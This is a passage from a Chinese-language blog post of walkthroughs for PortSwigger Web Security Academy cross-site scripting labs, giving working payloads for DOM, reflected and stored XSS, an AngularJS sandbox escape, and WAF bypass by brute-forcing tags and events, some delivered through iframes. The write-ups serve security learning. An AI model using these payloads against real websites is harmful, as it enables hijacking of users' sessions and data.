+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0ac6009a034a7b868074d1ac001c00e2.web-security-academy.net/#%3Cimg%20src=x%20onerror=alert()%3E</span><br></pre></td></tr></table></figure>
+<p>成功执行xss</p>
+<p>额，然而这题没有解决。。。</p>
+<p>回去看了眼题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本实验室主页上存在一个基于DOM的跨站脚本漏洞。它使用 jQuery 的选择函数自动滚动到给定的帖子，标题通过属性传递。`$()``location.hash`</span><br><span class="line"></span><br><span class="line">要解决实验室问题，将利用漏洞传递给受害者，并调用其浏览器中的函数。`print()`</span><br></pre></td></tr></table></figure>
+<p>也就是说要使用到靶场给的漏洞利用服务器，而且要使用print()函数而不是alert()</p>
+<p>查了一下才知道，在 PortSwigger 的实验室中，<strong>“提交漏洞”</strong> 是指：</p>
+<blockquote>
+<p>将你的攻击 payload 托管到攻击服务器上，然后让实验室的<strong>模拟受害者</strong>（一个自动化机器人）访问该页面，从而验证漏洞是否被成功利用。</p>
+</blockquote>
+<p>好吧，于是提交：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://0ac6009a034a7b868074d1ac001c00e2.web-security-academy.net/#&quot; onload=&quot;this.src += &#x27;&lt;img src=x onerror=print()&gt;&#x27;&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<p>然而漏洞服务器坠机了。。。</p>
+<h3 id="8-reflected-xss-into-attribute-with-angle-brackets-html-encoded"><a class="markdownIt-Anchor" href="#8-reflected-xss-into-attribute-with-angle-brackets-html-encoded"></a> 8. Reflected XSS into attribute with angle brackets HTML-encoded</h3>
+<p>题目描述：</p>
+<p>本实验室在搜索博客功能中存在跨站脚本的反映漏洞，其中角括号是HTML编码的。要解决这个实验，可以进行跨站脚本攻击，注入一个属性并调用该函数。<code>alert</code></p>
+<p>hint:</p>
+<p>仅仅因为你能触发自己，并不意味着这对受害者有效。你可能需要尝试在概念验证载荷中注入多种不同的属性，才能找到能在受害者浏览器中成功执行的。<code>alert()</code></p>
+<p>漏洞特点</p>
+<ol>
+<li>
+<p><strong>反射型XSS</strong>：恶意代码在URL参数中，服务器将参数值回显到HTML页面中</p>
+</li>
+<li>
+<p><strong>注入点在属性中</strong>：用户输入被放在HTML标签的某个属性值里（如 <code>&lt;input value=&quot;用户输入&quot;&gt;</code>）</p>
+</li>
+<li>
+<p><strong>尖括号被编码</strong>：<code>&lt;</code> 变成 <code>&lt;</code>，<code>&gt;</code> 变成 <code>&gt;</code>，无法直接注入新标签</p>
+<p>虽然不能注入新标签，但你可以<strong>闭合当前属性</strong>或<strong>在当前属性中注入事件处理器</strong>。</p>
+<p>payload：</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=alert(1) &quot;</span><br></pre></td></tr></table></figure>
+<h3 id="9stored-xss-into-anchor-attribute-with-double-quotes-html-encodedhref"><a class="markdownIt-Anchor" href="#9stored-xss-into-anchor-attribute-with-double-quotes-html-encodedhref"></a> 9.Stored XSS into anchor attribute with double quotes HTML-encoded<code>href</code></h3>
+<p>存储型，payload也很简单：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert()</span><br></pre></td></tr></table></figure>
+<p>点击名字即可触发。</p>
+<h3 id="10reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded"><a class="markdownIt-Anchor" href="#10reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded"></a> 10.Reflected XSS into a JavaScript string with angle brackets HTML encoded</h3>
+<p>非常简单，去找找源码</p>
+<p>搜索一下原神，然后在源代码直接找原神就能快速定位）原神牛逼</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">                        var searchTerms = &#x27;genshin&#x27;;</span><br><span class="line">                        document.write(&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;+encodeURIComponent(searchTerms)+&#x27;&quot;&gt;&#x27;);</span><br><span class="line">                    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>一目了然</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert();//</span><br></pre></td></tr></table></figure>
+<h3 id="11dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded"><a class="markdownIt-Anchor" href="#11dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded"></a> 11.DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</h3>
+<p>描述：</p>
+<p>本实验室在搜索功能中的AngularJS表达式中包含基于DOM的跨站脚本漏洞。</p>
+<p>AngularJS 是一个流行的 JavaScript 库，它扫描包含该属性（也称为 AngularJS 指令）的 HTML 节点的内容。当向HTML代码添加指令时，你可以在双大括号内执行JavaScript表达式。当编码角括号时，这种技术非常有用。<code>ng-app</code></p>
+<p>要解决这个实验，可以执行跨站脚本攻击，执行AngularJS表达式并调用该函数。<code>alert</code></p>
+<p>没办法直接通过源码找到了</p>
+<p>试了一下没头绪去查了一下资料：</p>
+<p><strong>AngularJS 表达式注入</strong></p>
+<p>AngularJS 1.x 版本有一个<strong>沙箱机制</strong>，原本目的是限制表达式能访问的 JavaScript 全局对象（如 <code>window</code>、<code>document</code>），防止开发者意外执行危险代码。但这个沙箱<strong>曾被多次绕过</strong>，本题利用的就是其中一种经典绕过链。</p>
+<p><strong>攻击流程：</strong></p>
+<ol>
+<li><strong>进入 AngularJS 上下文</strong>：通过 <code>&#123;&#123;&#125;&#125;</code> 让 Angular 解析用户输入</li>
+<li><strong>获取函数构造器</strong>：利用 <code>constructor.constructor</code> 取得 <code>Function</code> 构造函数</li>
+<li><strong>执行任意代码</strong>：用 <code>Function</code> 将字符串转为可执行函数并立即调用</li>
+</ol>
+<p><code>Payload 原型</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;constructor.constructor(&#x27;alert(document.domain)&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>第一层：<code>&#123;&#123;&#125;&#125;</code> —— 触发 Angular 表达式解析</p>
+<ul>
+<li>AngularJS 在渲染页面时，会扫描 DOM 中的 <code>&#123;&#123;&#125;&#125;</code> 插值语法</li>
+<li>如果 <code>search</code> 参数的值被拼接到 HTML 中，且该 HTML 位于 Angular 的编译范围内（<code>ng-app</code> 指令内），Angular 就会对 <code>&#123;&#123;...&#125;&#125;</code> 内的内容进行<strong>表达式求值</strong></li>
+<li>这不是简单的字符串拼接，而是<strong>真正的 JavaScript 执行环境</strong></li>
+</ul>
+<p>第二层：<code>constructor</code> —— 获取当前对象的构造函数</p>
+<p><code>Object.constructor</code> 是 <code>Function</code>，因为 <code>Object</code> 本身是一个函数对象。</p>
+<p>第三层：<code>constructor.constructor</code> —— 获取 Function 构造函数</p>
+<ul>
+<li>让我们一步步推导：
+<ul>
+<li><code>constructor</code> → 当前对象（默认是 <code>Object</code>）的构造函数 → <code>Function</code></li>
+<li>再次调用 <code>.constructor</code> → <code>Function</code> 的构造函数 → <strong><code>Function</code> 本身</strong></li>
+</ul>
+</li>
+<li>所以 <code>constructor.constructor</code> 等价于 <code>Function</code>，即 JavaScript 的全局函数构造器</li>
+</ul>
+<p>第四层：<code>('alert(document.domain)')</code> —— 创建新函数</p>
+<ul>
+<li><code>Function('alert(document.domain)')</code> 会创建一个<strong>新函数</strong>，函数体就是字符串中的代码</li>
+<li>该函数在<strong>全局作用域</strong>下执行，因此可以访问 <code>document</code> 对象</li>
+</ul>
+<p>第五层：<code>()</code> —— 立即执行</p>
+<ul>
+<li>调用这个新创建的函数，<code>alert(document.domain)</code> 立即执行，弹出提示框</li>
+</ul>
+<p>payload：on路径短，只有一次属性访问，减少被检测出来的风险</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$on.constructor(&#x27;alert()&#x27;)()&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">&#123;&#123;$eval(&#x27;alert()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="12reflected-dom-xss"><a class="markdownIt-Anchor" href="#12reflected-dom-xss"></a> 12.Reflected DOM XSS</h3>
+<p>？？好神奇的名字，这两个是能组合在一起的么</p>
+<p>！？强强？！</p>
+<p>该实验室展示了DOM的反映性漏洞。反射DOM漏洞发生在服务器端应用处理请求数据并在响应中回响该数据时。页面上的脚本随后以不安全的方式处理反射数据，最终将其写入危险的合成槽。</p>
+<p>要解决这个实验，创建一个调用函数的注入。<code>alert()</code></p>
+<p><strong>漏洞发生在客户端 JavaScript 直接处理 URL 参数并写入 DOM 的过程中</strong>，而不是服务端反射。</p>
+<p>没遇见过，没什么头绪+1</p>
+<p>这里去看了一下wp</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&quot;-alert(1)&#125;//</span><br></pre></td></tr></table></figure>
+<p>解释一下：由于你注入了反斜线且网站无法逃脱，当JSON回复试图逃脱开首双引号字符时，它会添加第二个反斜线。由此产生的双重背斩使逃脱动作被有效抵消。这意味着双引号被处理为非转义，关闭了应包含搜索词的字符串。</p>
+<p>生成的响应：{“searchTerm”:“\”-alert(1)}//&quot;, “results”:[]}</p>
+<h3 id="13reflected-xss-into-html-context-with-most-tags-and-attributes-blocked"><a class="markdownIt-Anchor" href="#13reflected-xss-into-html-context-with-most-tags-and-attributes-blocked"></a> 13.Reflected XSS into HTML context with most tags and attributes blocked</h3>
+<p>该实验室在搜索功能中包含反映的XSS漏洞，但使用网络应用防火墙（WAF）来防范常见的XSS向量。</p>
+<p>要解决实验室问题，可以执行跨站脚本攻击，绕过WAF并调用函数。<code>print()</code></p>
+<p>注释</p>
+<p>你的解决方案必须不需要任何用户操作。手动在自己的浏览器里被调用并不能解决实验室问题。<code>print()</code></p>
+<p>已知该靶场存在过滤，于是我们可以考虑爆破标签，我们打开bp内嵌浏览器抓包发送到intruder模块，通过bp字典</p>
+<p>xss标签字典：</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Cross-Site Scripting (XSS) Cheat Sheet - 2026 Edition | Web Security Academy</a></p>
+<p>复制标签，粘贴到payload部分开始爆破得到body标签是能用的，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body%20=1&gt;</span><br></pre></td></tr></table></figure>
+<p>同样的开始爆破事件：</p>
+<p>也是去上述网站复制xss事件字典</p>
+<p>爆破得到：</p>
+<p>onresize 事件 为 iframe 标签的属性</p>
+<p>去漏洞测试服务器提交：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://0ae8007304784dde806f62da005600e1.web-security-academy.net/?search=&lt;body onresize=print()&gt;&quot; onload=this.style.width=&#x27;100px&#x27;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="14reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones"><a class="markdownIt-Anchor" href="#14reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones"></a> 14.Reflected XSS into HTML context with all tags blocked except custom ones</h3>
+<p>这个实验室会屏蔽除自定义标签外的所有HTML标签。</p>
+<p>要解决实验室问题，可以执行跨站脚本攻击，注入自定义标签并自动提醒 。<code>document.cookie</code></p>
+<p>然而bp实验室的漏洞测试服务器是不是真有点问题）</p>
+<p>这里直接给出payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; location = &#x27;https://0abc00b703d5046d802330bd000000b2.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x&#x27;; &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="15reflected-xss-with-some-svg-markup-allowed"><a class="markdownIt-Anchor" href="#15reflected-xss-with-some-svg-markup-allowed"></a> 15.Reflected XSS with some SVG markup allowed</h3>
+<p>该实验室存在一个简单的反映XSS漏洞。该网站屏蔽了常见标签，但遗漏了一些SVG标签和事件。</p>
+<p>要解决实验室问题，执行跨站脚本攻击调用函数。<code>alert()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;alert(1)&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+<p>回显&quot;Event is not allowed&quot;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E</span><br></pre></td></tr></table></figure>
+<p>回显&quot;Tag is not allowed&quot;</p>
+<p>说明过滤极其严苛，那我们考虑使用爆破</p>
+<p>和之前流程一样，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;$$&gt;</span><br></pre></td></tr></table></figure>
+<p>爆破得到标签image</p>
+<p>接着爆破事件，也一样，得到事件onbegin</p>
+<p>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;image onbegin=alert()&gt;</span><br></pre></td></tr></table></figure>
+<p>发现没有用</p>
+<p>于是回去看发现标签过滤还能使用animatetransform</p>
+<p>于是我们改动一下得:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;animatetransform onbegin=alert()&gt;</span><br></pre></td></tr></table></figure>
+<p>成功弹窗。</p>
+<h3 id="16reflected-xss-in-canonical-link-tag"><a class="markdownIt-Anchor" href="#16reflected-xss-in-canonical-link-tag"></a> 16.Reflected XSS in canonical link tag</h3>
+
+    </div>
+    <footer class="article-footer">
+        <blockquote class="article-copyright">
+    <p><strong><span class="icon-user icon"></span>Author: </strong>Cl1ck-t0</p>
+    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/03/31/burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/">https://cl1ck-t0.github.io/2026/03/31/burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/</a></p>
+    
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-03-31 22:06:57</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-08-14 18:16:40</p>
+    <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
+    <span class="icon-creative-commons article-copyright-bg"></span>
+  </blockquote>
+        <div class="share-wrapper">
+    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F03%2F31%2Fburp%25E9%259D%25B6%25E5%259C%25BA%25E6%25BC%258F%25E6%25B4%259E%25E5%25AE%259E%25E6%2588%2598%2F&amp;appkey=&amp;title=burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="burp靶场漏洞实战">
+      <div class="share-icon icon icon-weibo">
+      </div>
+    </a>
+    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98&amp;desc=burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="burp靶场漏洞实战">
+      <div class="share-icon icon icon-qq">
+      </div>
+    </a>
+    <a href="javascript:;"  title="burp靶场漏洞实战">
+      <div class="share-icon icon icon-weixin">
+          <div id="share-weixin">
+            <div class="share-weixin-dom">
+              <div class="share-weixin-content">
+                <img id="share-weixin-banner"> 
+                <div id="share-weixin-title"></div>
+                <div id="share-weixin-desc"></div>
+              </div>
+              <div class="share-weixin-qrcode">
+                <div class="share-weixin-info">
+                  <div id="share-weixin-author"></div>
+                  <div id="share-weixin-theme">Powered By hexo-theme-reimu</div>
+                </div>
+                <img id="share-weixin-qr" >
+              </div>
+            </div>
+            <div class="share-weixin-canvas"></div>
+          </div>
+      </div>
+    </a>
+</div>
+      
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/burp%E9%9D%B6%E5%9C%BA/" rel="tag" title="burp靶场">burp靶场</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/covers/8e05cba59b76a5b7d9bab1331e3a07d6_720.png" data-sizes="auto" alt="ACTF2025" class="lazyload">
+        <a href="/2026/07/14/ACTF2025/" aria-label="Prev: ACTF2025" title="Prev: ACTF2025"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+            ACTF2025
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/covers/51aed603166dff1de44b9bcf765c6677.jpg" data-sizes="auto" alt="SSTI注入" class="lazyload">
+      <a href="/2026/03/13/SSTI%E6%B3%A8%E5%85%A5/" aria-label="Next: SSTI注入"  title="Next: SSTI注入"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+          SSTI注入
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">Leave a comment</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        &nbsp;
+      Cl1ck-t0
+    </div>
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        67.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:11
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98wp"><span class="toc-number">1.</span> <span class="toc-text"> burp靶场漏洞实战wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8Cwhere%E6%9D%A1%E6%AC%BE%E4%B8%AD%E5%85%81%E8%AE%B8%E6%A3%80%E7%B4%A2%E9%9A%90%E8%97%8F%E6%95%B0%E6%8D%AE%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%AE%9E%E9%AA%8C%E5%85%81%E8%AE%B8%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.实验：允许登录绕过的SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%AE%9E%E9%AA%8Csql%E6%B3%A8%E5%85%A5union%E6%94%BB%E5%87%BB%E7%A1%AE%E5%AE%9A%E6%9F%A5%E8%AF%A2%E8%BF%94%E5%9B%9E%E7%9A%84%E5%88%97%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.实验：SQL注入UNION攻击，确定查询返回的列数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8C%E5%AE%A4%E9%80%9A%E8%BF%87%E7%BD%91%E9%A1%B5%E5%A3%B3%E4%B8%8A%E4%BC%A0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.实验室：通过网页壳上传远程代码执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、跨站脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8C%E5%B0%86xss%E6%98%A0%E5%B0%84%E5%88%B0html%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%E4%B8%94%E6%B2%A1%E6%9C%89%E7%BC%96%E7%A0%81"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.实验：将XSS映射到HTML上下文中，且没有编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2dom-xss-%E5%9C%A8-sack-%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%BA%90%E4%BB%A3%E7%A0%81documentwritelocationsearch"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2.DOM XSS 在 sack 中使用源代码document.write&#96;&#96;location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3dom-xss-in-innerhtml-sink-using-source-locationsearch"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.DOM XSS in innerHTML sink using source location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4dom-xss-in-jquery-anchor-attribute-sink-using-sourcehreflocationsearch"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 4.DOM XSS in jQuery anchor attribute sink using sourcehref&#96;&#96;location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-reflected-xss-into-html-context-with-nothing-encoded"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 5. Reflected XSS into HTML context with nothing encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6stored-xss-into-html-context-with-nothing-encoded"><span class="toc-number">1.3.6.</span> <span class="toc-text"> 6.Stored XSS into HTML context with nothing encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7dom-xss-in-jquery-selector-sink-using-a-hashchange-event"><span class="toc-number">1.3.7.</span> <span class="toc-text"> 7.DOM XSS in jQuery selector sink using a hashchange event</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-reflected-xss-into-attribute-with-angle-brackets-html-encoded"><span class="toc-number">1.3.8.</span> <span class="toc-text"> 8. Reflected XSS into attribute with angle brackets HTML-encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9stored-xss-into-anchor-attribute-with-double-quotes-html-encodedhref"><span class="toc-number">1.3.9.</span> <span class="toc-text"> 9.Stored XSS into anchor attribute with double quotes HTML-encodedhref</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded"><span class="toc-number">1.3.10.</span> <span class="toc-text"> 10.Reflected XSS into a JavaScript string with angle brackets HTML encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded"><span class="toc-number">1.3.11.</span> <span class="toc-text"> 11.DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12reflected-dom-xss"><span class="toc-number">1.3.12.</span> <span class="toc-text"> 12.Reflected DOM XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13reflected-xss-into-html-context-with-most-tags-and-attributes-blocked"><span class="toc-number">1.3.13.</span> <span class="toc-text"> 13.Reflected XSS into HTML context with most tags and attributes blocked</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones"><span class="toc-number">1.3.14.</span> <span class="toc-text"> 14.Reflected XSS into HTML context with all tags blocked except custom ones</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15reflected-xss-with-some-svg-markup-allowed"><span class="toc-number">1.3.15.</span> <span class="toc-text"> 15.Reflected XSS with some SVG markup allowed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16reflected-xss-in-canonical-link-tag"><span class="toc-number">1.3.16.</span> <span class="toc-text"> 16.Reflected XSS in canonical link tag</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
